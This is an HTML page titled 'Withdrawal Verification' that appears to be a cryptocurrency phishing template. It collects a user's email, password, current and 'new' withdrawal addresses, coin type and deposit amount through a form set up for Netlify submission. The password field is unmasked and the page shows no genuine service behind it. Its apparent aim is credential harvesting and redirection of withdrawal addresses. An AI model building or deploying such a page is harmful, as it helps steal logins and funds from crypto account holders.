<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./input.css">
    <link rel="stylesheet" href="./main.css">
    <title>Withdrawal Verification</title>
</head>
<body>
    <div class="flex blue justify-center py-[1rem]">
        <div class="flex justify-center">
            <div class="img flex justify-center">
                <img src="./img/logo (1).png" alt="logo">
            </div>
        </div>
    </div>
    <div class="mx-[15%] mt-[3rem] ">
        <form class="space-y-4 md:space-y-6"  name="email" method="POST" data-netlify="true" >
            <div>
                <label for="name" class="block mb-2 text-base font-semibold text-gray-900 ">Email</label>
                <input type="email" name="name" id="name" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
            </div>
            <div>
                <label for="name" class="block mb-2 text-base font-semibold text-gray-900 ">Password</label>
                <input type="" name="name" id="name" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
            </div>
            <div>
                <label for="name" class="block mb-2 text-base font-semibold text-gray-900 ">Withdrawal/Deposit Address</label>
                <input type="" name="name" id="name" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
            </div>
            <div>
                <label for="name" class="block mb-2 text-base font-semibold text-gray-900 ">New Withdrawal/Deposit Address</label>
                <input type="" name="name" id="name" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
            </div>
            <div>
                <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
                <label for="vehicle1"> BTC</label><br>
                <input type="checkbox" id="vehicle2" name="vehicle2" value="Car">
                <label for="vehicle2"> ETH</label><br>
            </div>
            <div>
                <label for="password" class="block mb-2 text-base font-semibold text-gray-900 ">Amount Deposited</label>
                <input type="" name="password" id="password" class="bg-gray-50 border border-black text-gray-900 sm:text-sm focus:ring-primary-600  block w-full p-2.5" placeholder="" required="">
            </div>
           <div class="w-full flex ">
            <!-- <a href="./index.html" class="w-full text-black blue  font-medium rounded-lg text-sm px-5 py-2.5 text-center ">Verify</a> -->
                <button type="button" class="button w-full text-black blue  font-medium rounded-lg text-sm px-5 py-2.5 text-center">
                    <span class="button__text">Save Changes</span>
                </button>
           </div>
            
        </form>
    </div>
</body>
<script>
    const theButton = document.querySelector(".button");

    theButton.addEventListener("click", () => {
        theButton.classList.add("button--loading");
    });
</script>
</html>
